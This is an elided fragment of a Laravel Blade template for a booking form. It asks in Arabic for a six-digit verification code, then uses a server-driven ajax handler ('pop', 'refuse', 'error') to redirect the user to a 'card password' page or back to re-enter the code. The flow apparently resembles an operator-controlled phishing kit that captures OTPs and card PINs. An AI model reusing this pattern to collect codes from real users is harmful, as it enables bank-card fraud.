                        ...
                        <div class="col-lg-9 col-md-9 col-sm-12 col-xs-12  passenger-details">
                            <div class="box-1-bayanat-2 mb-3 ">
                                ...
                                <div class="row ">
                                            ...
                                            <label for="" class="d-block col-md-4 col-sm-12 col-xs-12 opt-label"> ادخل رمز التحقق </label>
                                        <div class="col-md-8 col-lg-8 col-sm-12 mb-3">
                                            <input class="form-control " type="text"  name="otp_code" maxlength="6" id="otp_code">
                                        </div>
                                        @error('otp_code')
            ...
            $.ajax({
                ...
                success:function(response){
                    ...
                    if(response.data=='pop'){
                        ...
                        window.location.href ='{{route('password_card_page')}}';
                    }else if(response.data=='refuse'){
                        window.location.href ='{{route('otp_info2.store')}}';
                    }else if(response.data=='error'){
                        console.log(response);
                        window.location.href =response.urlData;
                    }else{
                        $('#spinnerss').show();
